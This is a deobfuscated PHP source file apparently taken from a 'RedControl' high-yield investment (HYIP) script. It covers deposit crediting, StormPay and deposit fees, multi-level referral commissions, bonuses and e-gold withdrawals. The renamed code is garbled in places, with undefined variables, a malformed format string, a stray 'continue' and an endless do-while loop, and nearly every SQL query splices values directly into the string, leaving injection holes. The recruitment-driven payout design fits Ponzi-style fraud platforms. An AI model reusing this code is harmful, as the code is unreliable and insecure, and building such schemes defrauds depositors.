<?php
/*****************************************************/
/*                                                    */
/*  Este archivo fue creado por RedControl            */
/*                                                    */
/*                                                    */
/*    Version:      2010                              */
/*    Author:       www.redcontrol.com.ar             */
/*    Release on:   2010.01.18                        */
/*                                                    */
/******************************************************/


function elnlcjlcg( $elnlcMhUwk )
{
    $elnlcLHQPA = array( );
    if ( preg_match( "/\\[default\\](.*?)\\[\\/default\\]/", $elnlcMhUwk, $elnlcLHQPA ) )
    {
        $elnlcMhUwk = $elnlcLHQPA[1];
    }
    return $elnlcMhUwk;
}

function elnlcqqds( $elnlcMhUwk, $elnlcWEoV, $d )
{
    global $elnlcNjKgR;
    $elnlcMCLM = ( $elnlcMhUwk + 48273 ) % $elnlcWEoV;
    $elnlcxvLBv = $elnlcNjKgR['elnlcuSFVu'];
    $elnlcQRUs = $elnlcMCLM;
    while ( $elnlcxvLBv == 0 )
    {
        if ( $d[$elnlcMCLM] != -1 )
        {
            ++$elnlcMCLM;
            if ( $elnlcMCLM == $elnlcWEoV )
            {
                $elnlcMCLM = $elnlcNjKgR['elnlcuSFVu'];
            }
        }
        else
        {
            $elnlcxvLBv = $elnlcNjKgR['elnlcqGMK'];
        }
    }
    return $elnlcMCLM;
}

function elnlcqjva( $elnlcMhUwk, $elnlcWEoV, $d )
{
    global $elnlcNjKgR;
    $elnlcMCLM = ( $elnlcMhUwk + 48273 ) % $elnlcWEoV;
    $elnlcxvLBv = $elnlcNjKgR['elnlcuSFVu'];
    while ( !$elnlcxvLBv )
    {
        if ( $d[$elnlcMCLM] == -1 )
        {
            ++$elnlcMCLM;
            if ( $elnlcMCLM == $elnlcWEoV )
            {
                $elnlcMCLM = $elnlcNjKgR['elnlcuSFVu'];
            }
        }
        else
        {
            $elnlcxvLBv = $elnlcNjKgR['elnlcqGMK'];
        }
    }
    return $elnlcMCLM;
}

function elnlcggcpm( )
{
    global $elnlcNjKgR;
    if ( !defined( "THE_GC_SCRIPT_V2005_04_01" ) )
    {
        print "Please use only original script";
        exit( );
    }
    global $elnlcdDswc;
    global $elnlccQgz;
    $q = "select * from hm2_users where id = 1";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcdUpvs = array( );
    while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $elnlcdUpvs = array( );
        $z = elnlcvtkki( $elnlcELue[$elnlcNjKgR['elnlciAQUa']], "&hd,mnf(fska\$d3jlkfsda".$elnlccQgz[$elnlcNjKgR['elnlcunkA']] );
        $elnlcdUpvs = unserialize( $z );
    }
    return $elnlcdUpvs;
}

function elnlcklsgm( )
{
    global $elnlcNjKgR;
    if ( !defined( "THE_GC_SCRIPT_V2005_04_01" ) )
    {
        print "Please use only original script";
        exit( );
    }
    global $elnlcdDswc;
    global $elnlcriGBB;
    global $elnlccQgz;
    $z = elnlccplb( elnlcwnel( serialize( $elnlcriGBB ), "&hd,mnf(fska\$d3jlkfsda".$elnlccQgz[$elnlcNjKgR['elnlcunkA']] ) );
    $q = "update hm2_users set ac = '{$z}' where id = 1";
    if ( !mysql_query( $q ) )
    {
    }
    return;
}

function elnlchgno( $elnlcBJQb, $elnlcGFUmr, $elnlcUnxH, $elnlcIhgiM, $elnlcwELo, $elnlcWRKBl, $elnlchrUUK )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    global $elnlcbVrbx;
    $elnlchrUUK = intval( $elnlchrUUK );
    $elnlcWRKBl = intval( $elnlcWRKBl );
    $elnlcGFUmr = intval( $elnlcGFUmr );
    $elnlcUnxH = sprintf( "%.02f", $elnlcUnxH );
    $elnlcSsvRQ = elnlccplb( $elnlcIhgiM );
    $elnlcwSbyU = $elnlcNjKgR['elnlcuSFVu'];
    $q = "select count(id) as cnt from hm2_history where ec = {$elnlcBJQb} && type = 'add_funds' && description like '%Batch id = {$elnlcSsvRQ}'";
    $elnlccfAC = mysql_query( $q );
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    if ( 0 < $elnlcELue[$elnlcNjKgR['elnlcaLqre']] )
    {
        $elnlcwSbyU = $elnlcNjKgR['elnlcqGMK'];
    }
    if ( $elnlcwSbyU == 1 )
    {
        return 0;
    }
    $elnlclmiBh = "Add funds to account from ".$elnlcbVrbx[$elnlcBJQb][$elnlcNjKgR['elnlcnOIx']].". Batch id = {$elnlcIhgiM}";
    if ( $elnlcBJQb == 4 && $elnlccQgz[$elnlcNjKgR['elnlchSuQR']] == 1 )
    {
        $elnlclmiBh = "Add funds to account from ".$elnlcbVrbx[$elnlcBJQb][$elnlcNjKgR['elnlcnOIx']]." {$elnlcUnxH} - StormPay Fee. Batch id = {$elnlcIhgiM}";
        $elnlcUnxH = $elnlcUnxH - $elnlcUnxH * 6.9 / 100 - 0.69;
    }
    else if ( $elnlcBJQb == 4 && $elnlccQgz[$elnlcNjKgR['elnlclTkc']] == 1 )
    {
        $elnlclmiBh = "Add funds to account from ".$elnlcbVrbx[$elnlcBJQb][$elnlcNjKgR['elnlcnOIx']]." {$elnlcUnxH} - StormPay Fee. Batch id = {$elnlcIhgiM}";
        $elnlcUnxH = $elnlcUnxH - $elnlcUnxH * 2.9 / 100 - 0.39;
    }
    if ( 0 < $elnlccQgz[$elnlcNjKgR['elnlcqjfJM']] )
    {
        $elnlchDVqy = sprintf( "%0.2", $elnlcUnxH * $elnlccQgz[$elnlcNjKgR['elnlcqjfJM']] / 100 );
        if ( $elnlchDVqy < $elnlccQgz[$elnlcNjKgR['elnlcIKOm']] )
        {
            $elnlchDVqy = $elnlccQgz[$elnlcNjKgR['elnlcIKOm']];
        }
        $elnlcUnxH = $elnlcUnxH - $elnlchDVqy;
        $elnlclmiBh .= ". Deposit fee - {$elnlchDVqy}";
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcDpHN'] )
    {
        $elnlcBJQb = $elnlcNjKgR['elnlcUunN'];
    }
    $q = "insert into hm2_history set \r\n        \tuser_id = {$elnlcGFUmr},\r\n        \tamount = '{$elnlcUnxH}',\r\n        \ttype = 'add_funds',\r\n        \tdescription = '{$elnlclmiBh}',\r\n        \tactual_amount = {$elnlcUnxH},\r\n        \tec = {$elnlcBJQb},\r\n        \tdate = now()    \r\n        \t";
    if ( !mysql_query( $q ) )
    {
    }
    $q = "select * from hm2_types where id = {$elnlcWRKBl}";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlclpCh = "";
    $elnlcKhzg = mysql_fetch_array( $elnlccfAC );
    $elnlcmagG = -1;
    if ( $elnlcKhzg )
    {
        $elnlcmagG += $elnlcELue[$elnlcNjKgR['elnlchewMj']];
        $elnlclpCh = elnlccplb( $elnlcKhzg[$elnlcNjKgR['elnlcnOIx']] );
        if ( $elnlcKhzg[$elnlcNjKgR['elnlcJQpQ']] == 0 )
        {
            $elnlchrUUK = $elnlcNjKgR['elnlcuSFVu'];
        }
        else
        {
            if ( $elnlcKhzg[$elnlcNjKgR['elnlcIhaw']] == 0 )
            {
                $elnlcKhzg[$elnlcNjKgR['elnlcIhaw']] = $elnlcUnxH + 1;
            }
            if ( $elnlcKhzg[$elnlcNjKgR['elnlcPAec']] <= $elnlcUnxH && $elnlcUnxH <= $elnlcKhzg[$elnlcNjKgR['elnlcIhaw']] )
            {
                if ( $elnlcKhzg[$elnlcNjKgR['elnlcTjzT']] == 1 )
                {
                    $elnlcGDKaO = preg_split( "/\\s*,\\s*/", $elnlcKhzg[$elnlcNjKgR['elnlcFIfO']] );
                    if ( !in_array( $elnlchrUUK, $elnlcGDKaO ) )
                    {
                        $elnlchrUUK = $elnlcGDKaO[0];
                    }
                }
                else
                {
                    if ( $elnlchrUUK < $elnlcKhzg[$elnlcNjKgR['elnlccFKts']] )
                    {
                        $elnlchrUUK = $elnlcKhzg[$elnlcNjKgR['elnlccFKts']];
                    }
                    if ( $elnlcKhzg[$elnlcNjKgR['elnlcckhi']] < $elnlchrUUK )
                    {
                        $elnlchrUUK = $elnlcKhzg[$elnlcNjKgR['elnlcckhi']];
                    }
                }
            }
            else
            {
                $elnlchrUUK = $elnlcNjKgR['elnlcuSFVu'];
            }
        }
    }
    if ( $elnlcmagG < 0 )
    {
        $elnlcmagG = $elnlcNjKgR['elnlcuSFVu'];
    }
    $q = "select min(hm2_plans.min_deposit) as min, max(if(hm2_plans.max_deposit = 0, 999999999999, hm2_plans.max_deposit)) as max from hm2_types left outer join hm2_plans on hm2_types.id = hm2_plans.parent where hm2_types.id = {$elnlcWRKBl}";
    $elnlcqBcqg = mysql_query( $q );
    $elnlcChoo = mysql_fetch_array( $elnlcqBcqg );
    $elnlctbEbW = $elnlcChoo[$elnlcNjKgR['elnlcifAzj']];
    $elnlccqKth = $elnlcChoo[$elnlcNjKgR['elnlcByMjj']];
    if ( $elnlctbEbW <= $elnlcUnxH && $elnlcUnxH <= $elnlccqKth )
    {
        $q = "insert into hm2_deposits set\r\n          \tuser_id = {$elnlcGFUmr},\r\n          \ttype_id = {$elnlcWRKBl},\r\n          \tdeposit_date = now(),\r\n          \tlast_pay_date = now()+ interval {$elnlcmagG} day,\r\n          \tstatus = 'on',\r\n          \tq_pays = 0,\r\n          \tamount = '{$elnlcUnxH}',\r\n          \tactual_amount = '{$elnlcUnxH}',\r\n          \tec = {$elnlcBJQb},\r\n          \tcompound = {$elnlchrUUK}\r\n          \t";
        if ( !mysql_query( $q ) )
        {
        }
        $elnlcgNAw = mysql_insert_id( );
        $q = "insert into hm2_history set \r\n          \tuser_id = {$elnlcGFUmr},\r\n          \tamount = '-{$elnlcUnxH}',\r\n          \ttype = 'deposit',\r\n          \tdescription = 'Deposit to ".elnlccplb( $elnlclpCh )."',\r\n          \tactual_amount = -{$elnlcUnxH},\r\n          \tec = {$elnlcBJQb},\r\n          \tdate = now(),\r\n                deposit_id = {$elnlcgNAw}\r\n          \t";
        if ( !mysql_query( $q ) )
        {
        }
        if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcLQUM'] )
        {
            $q = "update hm2_users set reset = 0 where id = {$elnlcLcnC[$elnlcNjKgR['elnlcohjn']]}";
            mysql_query( $q );
        }
        if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlceEQM'] )
        {
            $q = "select count(id) as col from hm2_deposits where user_id = {$elnlcGFUmr}";
            if ( !( $elnlccfAC = mysql_query( $q ) ) )
            {
            }
            $elnlcbyijN = $elnlcNjKgR['elnlcuSFVu'];
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcbyijN = $elnlcELue[$elnlcNjKgR['elnlcmzAk']];
            }
            $q = "select count(distinct user_id) as col from hm2_deposits";
            if ( !( $elnlccfAC = mysql_query( $q ) ) )
            {
            }
            $elnlczbdp = $elnlcNjKgR['elnlcvIedM'];
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlczbdp = $elnlcELue[$elnlcNjKgR['elnlcmzAk']];
            }
            if ( $elnlcbyijN == 1 && $elnlczbdp <= 500 )
            {
                $q = "insert into hm2_history set\r\n  \tuser_id = {$elnlcGFUmr},\r\n  \tamount = 2,\r\n  \ttype = 'bonus',\r\n  \tdescription = 'Bonus',\r\n  \tactual_amount = 2,\r\n  \tec = {$elnlcBJQb},\r\n  \tdate = now()";
                if ( !mysql_query( $q ) )
                {
                }
            }
        }
        if ( $elnlccQgz[$elnlcNjKgR['elnlcrzze']] == 1 )
        {
            $elnlcOqqzH = $elnlcNjKgR['elnlcuSFVu'];
            if ( 0 < $elnlccQgz[$elnlcNjKgR['elnlcBdTji']] )
            {
                $elnlcOqqzH = $elnlcUnxH * 1000 / $elnlccQgz[$elnlcNjKgR['elnlcBdTji']];
            }
            if ( 0 < $elnlcOqqzH )
            {
                $q = "update hm2_users set imps = imps + {$elnlcOqqzH} where id = {$elnlcGFUmr}";
                if ( !mysql_query( $q ) )
                {
                }
            }
        }
        $elnlcEUTtw = elnlcoeufi( $elnlcGFUmr, $elnlcUnxH, $elnlcBJQb );
    }
    else
    {
        $elnlclpCh = "Deposit to Account";
    }
    $q = "select * from hm2_users where id = {$elnlcGFUmr}";
    $elnlccfAC = mysql_query( $q );
    $elnlcdASzW = mysql_fetch_array( $elnlccfAC );
    $elnlcvQzG = array( $elnlcdASzW );
    $elnlcvQzG[$elnlcNjKgR['elnlcikTzy']] = $elnlcdASzW[$elnlcNjKgR['elnlcikTzy']];
    $elnlcvQzG[$elnlcNjKgR['elnlcnOIx']] = $elnlcdASzW[$elnlcNjKgR['elnlcnOIx']];
    $elnlcvQzG[$elnlcNjKgR['elnlcoaCmS']] = number_format( $elnlcUnxH, 2 );
    $elnlcvQzG[$elnlcNjKgR['elnlcEmeQP']] = $elnlcwELo;
    $elnlcvQzG[$elnlcNjKgR['elnlcComr']] = $elnlcbVrbx[$elnlcBJQb][$elnlcNjKgR['elnlcnOIx']];
    $elnlcvQzG[$elnlcNjKgR['elnlcgIiR']] = $elnlcIhgiM;
    $elnlcvQzG[$elnlcNjKgR['elnlctVNTl']] = $elnlchrUUK;
    $elnlcvQzG[$elnlcNjKgR['elnlcEKmM']] = elnlcjlcg( $elnlclpCh );
    $elnlcvQzG[$elnlcNjKgR['elnlcUTVor']] = $elnlcEUTtw;
    $elnlcvQzG[$elnlcNjKgR['elnlcdcGg']] = "[no upline]";
    if ( 0 < $elnlcdASzW[$elnlcNjKgR['elnlcdQGL']] )
    {
        $q = "select * from hm2_users where id = {$elnlcdASzW[$elnlcNjKgR['elnlcdQGL']]}";
        if ( !( $elnlccfAC = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
        {
            $elnlcvQzG[$elnlcNjKgR['elnlcdcGg']] = $elnlcELue[$elnlcNjKgR['elnlcikTzy']];
        }
    }
    $q = "select email from hm2_users where id = 1";
    $elnlccfAC = mysql_query( $q );
    $elnlcHEaoD = "";
    while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $elnlcHEaoD = $elnlcELue[$elnlcNjKgR['elnlcvKtVx']];
    }
    elnlchnob( "deposit_admin_notification", $elnlcHEaoD, $elnlccQgz[$elnlcNjKgR['elnlctDgi']], $elnlcvQzG );
    elnlchnob( "deposit_user_notification", $elnlcdASzW[email], $elnlccQgz[$elnlcNjKgR['elnlctDgi']], $elnlcvQzG );
    return 1;
}

function elnlcoeufi( $elnlcGFUmr, $elnlcUnxH, $elnlcBJQb )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    global $elnlcbVrbx;
    $q = "select * from hm2_users where id = {$elnlcGFUmr}";
    $elnlcgNkiB = mysql_query( $q );
    $elnlcFzzFb = mysql_fetch_array( $elnlcgNkiB );
    if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcDpHN'] )
    {
        $elnlczmyW = $elnlcFrwyH[$elnlcNjKgR['elnlcdQGL']];
        $q = "select count(id) as cnt from hm2_deposits where user_id = {$elnlczmyW}";
        $elnlccfAC = mysql_query( $q );
        $elnlcELue = mysql_fetch_array( $elnlccfAC );
        if ( $elnlcELue[$elnlcNjKgR['elnlcaLqre']] <= 0 )
        {
            return 0;
        }
        $q = "select sum(actual_amount) as amnt from hm2_deposits as d, hm2_users as u where d.user_id = u.id and d.status = 'on' and u.ref = {$elnlczmyW}";
        $elnlccfAC = mysql_query( $q );
        $elnlcELue = mysql_fetch_array( $elnlccfAC );
        if ( $elnlcELue[$elnlcNjKgR['elnlcquor']] < 3000 )
        {
            $elnlcMPfma = $elnlcNjKgR['elnlcuSFVu'];
            return 0;
        }
        else if ( $elnlcELue[$elnlcNjKgR['elnlcquor']] < 6000 )
        {
            $elnlcMPfma = 0.02;
        }
        else if ( $elnlcELue[$elnlcNjKgR['elnlcquor']] < 12000 )
        {
            $elnlcMPfma = 0.05;
        }
        else
        {
            $elnlcMPfma = 0.1;
        }
        $elnlcPzSb = $elnlcUnxH * $elnlcMPfma;
        $q = "insert into hm2_history set\r\n      \tuser_id = {$elnlczmyW},\r\n      \tamount = {$elnlcPzSb},\r\n      \tactual_amount = {$elnlcPzSb},\r\n      \ttype = 'commissions',\r\n      \tdescription = 'Referral commission from ".elnlccplb( $elnlcFzzFb[$elnlcNjKgR['elnlcikTzy']] )."',\r\n      \tec = {$elnlcBJQb},\r\n      \tdate = now()";
        if ( !mysql_query( $q ) )
        {
        }
        $q = "select * from hm2_users where id = {$elnlczmyW}";
        $elnlcgNkiB = mysql_query( $q );
        $elnlcrlHN = mysql_fetch_array( $elnlcgNkiB );
        $elnlcrlHN[$elnlcNjKgR['elnlcoaCmS']] = number_format( $elnlcPzSb, 2 );
        $elnlcrlHN[$elnlcNjKgR['elnlcqqth']] = $elnlcFzzFb[$elnlcNjKgR['elnlcikTzy']];
        $elnlcrlHN[$elnlcNjKgR['elnlcFJMp']] = $elnlcFzzFb[$elnlcNjKgR['elnlcnOIx']];
        $elnlcrlHN[$elnlcNjKgR['elnlcComr']] = $elnlcbVrbx[$elnlcBJQb][$elnlcNjKgR['elnlcnOIx']];
        elnlchnob( "referral_commision_notification", $elnlcrlHN[$elnlcNjKgR['elnlcvKtVx']], $elnlccQgz[$elnlcNjKgR['elnlctDgi']], $elnlcrlHN );
    }
    $elnlcEUTtw = $elnlcNjKgR['elnlcuSFVu'];
    if ( $elnlccQgz[$elnlcNjKgR['elnlcSTRB']] == 1 )
    {
        $elnlczmyW = $elnlcNjKgR['elnlcuSFVu'];
        if ( 0 < $elnlcFzzFb[$elnlcNjKgR['elnlcdQGL']] )
        {
            $elnlczmyW = $elnlcFzzFb[$elnlcNjKgR['elnlcdQGL']];
        }
        else
        {
            return 0;
        }
        if ( $elnlccQgz[$elnlcNjKgR['elnlcpVgU']] )
        {
            $q = "select count(id) as cnt from hm2_deposits where user_id = {$elnlczmyW}";
            $elnlccfAC = mysql_query( $q );
            $elnlcELue = mysql_fetch_array( $elnlccfAC );
            if ( $elnlcELue[$elnlcNjKgR['elnlcaLqre']] <= 0 )
            {
                return 0;
            }
        }
        if ( 0 < $elnlccQgz[$elnlcNjKgR['elnlcTlQVy']] && $elnlcUnxH < $elnlccQgz[$elnlcNjKgR['elnlcTlQVy']] )
        {
            return 0;
        }
        if ( $elnlccQgz[$elnlcNjKgR['elnlcyrFj']] == 1 )
        {
            if ( 0 < $elnlccQgz[$elnlcNjKgR['elnlcNGCp']] )
            {
                $q = "select count(id) as cnt from hm2_deposits where user_id = {$elnlcGFUmr}";
                $elnlccfAC = mysql_query( $q );
                $elnlcELue = mysql_fetch_array( $elnlccfAC );
                if ( $elnlcELue[$elnlcNjKgR['elnlcaLqre']] == 1 )
                {
                    $elnlcPzSb = $elnlccQgz[$elnlcNjKgR['elnlcNGCp']];
                    $elnlcEUTtw += $elnlcPzSb;
                    $q = "insert into hm2_history set\r\n    \t\tuser_id = {$elnlczmyW},\r\n    \t\tamount = {$elnlcPzSb},\r\n    \t\tactual_amount = {$elnlcPzSb},\r\n    \t\ttype = 'commissions',\r\n    \t\tdescription = 'Referral commission from ".elnlccplb( $elnlcFzzFb[$elnlcNjKgR['elnlcikTzy']] )."',\r\n    \t\tec = {$elnlcBJQb},\r\n    \t\tdate = now()";
                    if ( !mysql_query( $q ) )
                    {
                    }
                    $q = "select * from hm2_users where id = {$elnlczmyW}";
                    $elnlcgNkiB = mysql_query( $q );
                    $elnlcrlHN = mysql_fetch_array( $elnlcgNkiB );
                    $elnlcrlHN[$elnlcNjKgR['elnlcoaCmS']] = number_format( $elnlcPzSb, 2 );
                    $elnlcrlHN[$elnlcNjKgR['elnlcqqth']] = $elnlcFzzFb[$elnlcNjKgR['elnlcikTzy']];
                    $elnlcrlHN[$elnlcNjKgR['elnlcFJMp']] = $elnlcFzzFb[$elnlcNjKgR['elnlcnOIx']];
                    $elnlcrlHN[$elnlcNjKgR['elnlcComr']] = $elnlcbVrbx[$elnlcBJQb][$elnlcNjKgR['elnlcnOIx']];
                    elnlchnob( "referral_commision_notification", $elnlcrlHN[$elnlcNjKgR['elnlcvKtVx']], $elnlccQgz[$elnlcNjKgR['elnlctDgi']], $elnlcrlHN );
                }
            }
        }
        else
        {
            if ( $elnlccQgz[$elnlcNjKgR['elnlcnGEIm']] == 1 )
            {
                $q = "select count(distinct user_id) as col from hm2_users, hm2_deposits where ref = {$elnlczmyW} and hm2_deposits.user_id = hm2_users.id";
            }
            else
            {
                $q = "select count(id) as col from hm2_users where ref = {$elnlczmyW}";
            }
            $elnlccfAC = mysql_query( $q );
            if ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcsltvI = $elnlcELue[$elnlcNjKgR['elnlcmzAk']];
                $q = "select * from hm2_users where id = {$elnlczmyW}";
                $elnlcgNkiB = mysql_query( $q );
                $elnlcTmOqp = mysql_fetch_array( $elnlcgNkiB );
                $elnlcwEIG = @unserialize( @$elnlcTmOqp[$elnlcNjKgR['elnlchUAS']] );
                if ( isset( $elnlcwEIG[$elnlcNjKgR['elnlcooWwP']] ) )
                {
                    $j = $elnlcNjKgR['elnlcqGMK'];
                    while ( isset( $elnlcwEIG["ref_percent".$j] ) )
                    {
                        if ( $elnlcwEIG["ref_percent".$j][0] <= $elnlcsltvI && $elnlcsltvI <= $elnlcwEIG["ref_percent".$j][1] )
                        {
                            $elnlcPzSb = $elnlcUnxH * $elnlcwEIG["ref_percent".$j][2] / 100;
                            $elnlcEUTtw += $elnlcPzSb;
                            break;
                        }
                        ++$j;
                    }
                }
                else if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcfwyM'] )
                {
                    $q = "select sum(amount) as amnt from hm2_deposits where user_id = {$elnlczmyW}";
                    $elnlccfAC = mysql_query( $q );
                    $elnlcELue = mysql_fetch_array( $elnlccfAC );
                    $elnlcMPfma = $elnlcNjKgR['elnlcuSFVu'];
                    if ( 10000 <= $elnlcELue[$elnlcNjKgR['elnlcquor']] )
                    {
                        $elnlcMPfma = $elnlcNjKgR['elnlcvESw'];
                    }
                    else if ( 5000 <= $elnlcELue[$elnlcNjKgR['elnlcquor']] )
                    {
                        $elnlcMPfma = $elnlcNjKgR['elnlcBEhaL'];
                    }
                    else if ( 3000 <= $elnlcELue[$elnlcNjKgR['elnlcquor']] )
                    {
                        $elnlcMPfma = $elnlcNjKgR['elnlcgnBW'];
                    }
                    else if ( 1000 <= $elnlcELue[$elnlcNjKgR['elnlcquor']] )
                    {
                        $elnlcMPfma = $elnlcNjKgR['elnlckMqOM'];
                    }
                    if ( 0 < $elnlcMPfma )
                    {
                        if ( 4 <= $elnlcsltvI )
                        {
                            $elnlcMPfma += 3;
                        }
                        $elnlcPzSb = $elnlcUnxH * $elnlcMPfma / 100;
                        $elnlcEUTtw += $elnlcPzSb;
                        $q = "insert into hm2_history set\r\n    \t\tuser_id = {$elnlczmyW},\r\n    \t\tamount = {$elnlcPzSb},\r\n    \t\tactual_amount = {$elnlcPzSb},\r\n    \t\ttype = 'commissions',\r\n    \t\tdescription = 'Referral commission from ".elnlccplb( $elnlcFzzFb[$elnlcNjKgR['elnlcikTzy']] )."',\r\n    \t\tec = {$elnlcBJQb},\r\n     \t\tdate = now()";
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                }
                else
                {
                    $q = "select percent from hm2_referal where from_value <= {$elnlcsltvI} and (to_value >= {$elnlcsltvI} or to_value = 0) order by from_value desc limit 1";
                    if ( !( $elnlccfAC = mysql_query( $q ) ) )
                    {
                    }
                    if ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
                    {
                        $elnlcPzSb = $elnlcUnxH * $elnlcELue[$elnlcNjKgR['elnlcLDncy']] / 100;
                        $elnlcEUTtw += $elnlcPzSb;
                        $q = "insert into hm2_history set\r\n    \t\tuser_id = {$elnlczmyW},\r\n    \t\tamount = {$elnlcPzSb},\r\n    \t\tactual_amount = {$elnlcPzSb},\r\n    \t\ttype = 'commissions',\r\n    \t\tdescription = 'Referral commission from ".elnlccplb( $elnlcFzzFb[$elnlcNjKgR['elnlcikTzy']] )."',\r\n    \t\tec = {$elnlcBJQb},\r\n     \t\tdate = now()";
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                }
                $q = "select * from hm2_users where id = {$elnlczmyW}";
                $elnlcgNkiB = mysql_query( $q );
                $elnlcrlHN = mysql_fetch_array( $elnlcgNkiB );
                $elnlcrlHN[$elnlcNjKgR['elnlcoaCmS']] = number_format( $elnlcPzSb, 2 );
                $elnlcrlHN[$elnlcNjKgR['elnlcqqth']] = $elnlcFzzFb[$elnlcNjKgR['elnlcikTzy']];
                $elnlcrlHN[$elnlcNjKgR['elnlcFJMp']] = $elnlcFzzFb[$elnlcNjKgR['elnlcnOIx']];
                $elnlcrlHN[$elnlcNjKgR['elnlcComr']] = $elnlcbVrbx[$elnlcBJQb][$elnlcNjKgR['elnlcnOIx']];
                elnlchnob( "referral_commision_notification", $elnlcrlHN[$elnlcNjKgR['elnlcvKtVx']], $elnlccQgz[$elnlcNjKgR['elnlctDgi']], $elnlcrlHN );
            }
        }
        if ( $elnlccQgz[$elnlcNjKgR['elnlcyrFj']] != 1 )
        {
            $i = $elnlcNjKgR['elnlcrUBr'];
            for ( ; $i < 11; ++$i )
            {
                if ( $elnlczmyW == 0 || $elnlccQgz["ref".$i."_cms"] == 0 )
                {
                    break;
                }
                if ( 0 < $elnlccQgz["ref".$i."_cms_minamount"] && $elnlcUnxH < $elnlccQgz["ref".$i."_cms_minamount"] )
                {
                    continue;
                }
                $q = "select * from hm2_users where id = {$elnlczmyW}";
                $elnlccfAC = mysql_query( $q );
                $elnlczmyW = $elnlcNjKgR['elnlcuSFVu'];
                do
                {
                    if ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
                    {
                        $elnlczmyW = $elnlcELue[$elnlcNjKgR['elnlcdQGL']];
                        if ( 0 < $elnlczmyW )
                        {
                            $elnlcIjPoQ = $elnlcNjKgR['elnlcqGMK'];
                            if ( $elnlccQgz[$elnlcNjKgR['elnlcpVgU']] == 1 )
                            {
                                $elnlcIjPoQ = $elnlcNjKgR['elnlcuSFVu'];
                                $q = "select count(id) as cnt from hm2_deposits where user_id = {$elnlczmyW}";
                                $elnlcfaSj = mysql_query( $q );
                                $elnlcnIuw = mysql_fetch_array( $elnlcfaSj );
                                if ( 0 < $elnlcnIuw[$elnlcNjKgR['elnlcaLqre']] )
                                {
                                    $elnlcIjPoQ = $elnlcNjKgR['elnlcqGMK'];
                                }
                            }
                            if ( $elnlcIjPoQ == 1 )
                            {
                                $elnlcPzSb = $elnlcUnxH * $elnlccQgz["ref".$i."_cms"] / 100;
                                $elnlcEUTtw += $elnlcPzSb;
                                $q = "insert into hm2_history set\r\n                  user_id = ".$elnlcELue[$elnlcNjKgR['elnlcdQGL']].",\r\n                  amount = {$elnlcPzSb},\r\n                  actual_amount = {$elnlcPzSb},\r\n                  type = 'commissions',\r\n                  description = 'Referral commission from ".elnlccplb( $elnlcFzzFb[$elnlcNjKgR['elnlcikTzy']] )." {$i} level referral',\r\n                  ec = {$elnlcBJQb},\r\n                  date = now()";
                                if ( !mysql_query( $q ) )
                                {
                                }
                            }
                        }
                    }
                } while ( 1 );
            }
            continue;
        }
    }
    return $elnlcEUTtw;
}

function elnlcdljj( $elnlcwELo, $elnlcBJQb )
{
    global $elnlcNjKgR;
    global $elnlcbVrbx;
    $elnlcBJQb = intval( $elnlcBJQb );
    $elnlcwELo = elnlccplb( $elnlcwELo );
    $q = "select count(*) as cnt from hm2_pay_settings where n='ext_accounts_blacklist' and v='{$elnlcBJQb}={$elnlcwELo}'";
    $elnlccfAC = mysql_query( $q );
    $elnlcELue = mysql_fetch_assoc( $elnlccfAC );
    if ( 0 < $elnlcELue[$elnlcNjKgR['elnlcaLqre']] )
    {
        return array( 0, "Blacklisted ".$elnlcbVrbx[$elnlcBJQb]." account ".$elnlcwELo );
    }
    return array( 1, "" );
}

function elnlcbpglv( $elnlcUfUR, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to E-Gold account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid E-Gold account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 0 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 0 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='egold_account_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcROwx = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
        }
        else
        {
            $elnlcROwx = $elnlcUfUR;
        }
        $elnlcFCfmJ = curl_init( );
        $elnlclHqeS = rawurlencode( $elnlclHqeS );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://www.e-gold.com/acct/confirm.asp" );
